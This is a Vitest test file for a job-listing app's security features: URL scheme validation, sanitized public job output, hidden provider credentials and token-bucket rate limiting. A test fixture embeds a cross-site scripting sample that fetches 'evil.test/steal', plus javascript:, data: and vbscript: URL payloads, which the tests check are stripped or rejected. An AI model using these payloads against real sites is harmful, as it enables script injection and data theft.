import { afterAll, describe, expect, it, vi } from "vitest";
import {
  FEED_RATE_LIMIT,
  SEARCH_RATE_LIMIT,
  checkRateLimit,
  clientKey,
  rateLimitHeaders,
} from "@/lib/rate-limit";
import { getProviderInfo, getMissingEnv } from "@/jobs/providers";
import { isSafeExternalUrl } from "@/jobs/providers/http";
import { resolveOfficialApplicationUrl, toPublicJob } from "@/jobs/services/job-service";
import type { Job, JobSourceRef } from "@/types";

const originalFetch = global.fetch;
afterAll(() => {
  global.fetch = originalFetch;
});

function makeJob(overrides: Partial<Job> = {}): Job {
  return {
    id: "job-sec-1",
    provider: "GREENHOUSE",
    source: "Greenhouse",
    title: "Senior Full Stack Engineer",
    company: "Linear",
    description:
      '<p>Build with React.</p><script>fetch("https://evil.test/steal")</script><img src=x onerror="alert(1)">',
    location: "Remote - US",
    remote: true,
    workplaceType: "REMOTE",
    employmentType: "Full-time",
    salaryMin: 100000,
    salaryMax: 150000,
    salaryCurrency: "USD",
    skills: ["React"],
    sourceUrl: "https://boards.greenhouse.io/linear/jobs/4091",
    applicationUrl: "https://boards.greenhouse.io/linear/jobs/4091",
    applicationType: "API_SUPPORTED",
    atsProvider: "GREENHOUSE",
    isReported: false,
    isActive: true,
    postedAt: "2026-10-01T00:00:00.000Z",
    rawData: { greenhouseId: 4091, secretProviderBlob: "do-not-ship" },
    createdAt: "",
    updatedAt: "",
    ...overrides,
  };
}

describe("outbound URL validation", () => {
  it("accepts https and rejects executable/data schemes", () => {
    expect(isSafeExternalUrl("https://linear.app/careers/1")).toBe(true);
    expect(isSafeExternalUrl("http://linear.app/careers/1")).toBe(true);
    expect(isSafeExternalUrl("javascript:alert(1)")).toBe(false);
    expect(isSafeExternalUrl("data:text/html;base64,PHNjcmlwdD4=")).toBe(false);
    expect(isSafeExternalUrl("vbscript:msgbox(1)")).toBe(false);
    expect(isSafeExternalUrl("not a url")).toBe(false);
    expect(isSafeExternalUrl(null)).toBe(false);
  });

  it("prefers the employer page over aggregator redirects", () => {
    const refs: JobSourceRef[] = [
      {
        provider: "ADZUNA",
        externalId: "1",
        sourceUrl: "https://www.adzuna.co.uk/jobs/land/ad/1",
        applicationUrl: "https://www.adzuna.co.uk/jobs/land/ad/1",
      },
      {
        provider: "GREENHOUSE",
        externalId: "4091",
        sourceUrl: "https://linear.app/careers/4091",
        applicationUrl: "https://linear.app/careers/4091",
      },
    ];

    expect(resolveOfficialApplicationUrl(makeJob({ sources: refs }))).toBe("https://linear.app/careers/4091");
    expect(
      resolveOfficialApplicationUrl(
        makeJob({ sources: [], applicationUrl: "https://jobs.lever.co/linear/1" })
      )
    ).toBe("https://jobs.lever.co/linear/1");
    expect(resolveOfficialApplicationUrl(makeJob({ sources: [], applicationUrl: "", sourceUrl: "" }))).toBe(
      null
    );
  });
});

describe("public job serialization", () => {
  it("never ships provider rawData or executable markup to the client", () => {
    const publicJob = toPublicJob(makeJob());

    expect(JSON.stringify(publicJob)).not.toContain("do-not-ship");
    expect((publicJob as unknown as Record<string, unknown>).rawData).toBeUndefined();
    expect(publicJob.description).not.toContain("<script>");
    expect(publicJob.description).not.toContain("onerror");
    expect(publicJob.description).toContain("Build with React.");
  });
});

describe("provider credentials", () => {
  it("exposes configuration state but never secret values", () => {
    const info = getProviderInfo();
    const adzuna = info.find((provider) => provider.name === "ADZUNA")!;

    expect(adzuna.requiredEnv).toEqual(expect.arrayContaining(["ADZUNA_APP_ID", "ADZUNA_APP_KEY"]));
    expect(adzuna.isConfigured).toBe(true); // test env provides both values
    expect(JSON.stringify(info)).not.toContain("test-app-key");

    expect(getMissingEnv("ADZUNA")).toEqual([]);
  });
});

describe("rate limiting", () => {
  it("allows the burst, then blocks with a retry hint", () => {
    const config = { limit: 2, perMinute: 60 };
    const key = `test-bucket-${Math.random()}`;

    expect(checkRateLimit(key, config).allowed).toBe(true);
    expect(checkRateLimit(key, config).allowed).toBe(true);

    const blocked = checkRateLimit(key, config);
    expect(blocked.allowed).toBe(false);
    expect(blocked.remaining).toBe(0);
    expect(blocked.retryAfterSeconds).toBeGreaterThanOrEqual(1);
    expect(rateLimitHeaders(blocked)["retry-after"]).toBeTruthy();
  });

  it("refills tokens over time", () => {
    const config = { limit: 1, perMinute: 60 };
    const key = `refill-${Math.random()}`;
    expect(checkRateLimit(key, config).allowed).toBe(true);
    expect(checkRateLimit(key, config).allowed).toBe(false);

    const now = Date.now();
    const spy = vi.spyOn(Date, "now").mockReturnValue(now + 60_000);
    try {
      expect(checkRateLimit(key, config).allowed).toBe(true);
    } finally {
      spy.mockRestore();
    }
  });

  it("derives a client key from proxy headers", () => {
    const request = new Request("https://app.test/api/jobs/feed", {
      headers: { "x-forwarded-for": "203.0.113.9, 10.0.0.1" },
    });
    expect(clientKey(request)).toBe("203.0.113.9");
    expect(FEED_RATE_LIMIT.limit).toBeGreaterThan(0);
    expect(SEARCH_RATE_LIMIT.perMinute).toBeGreaterThan(0);
  });
});
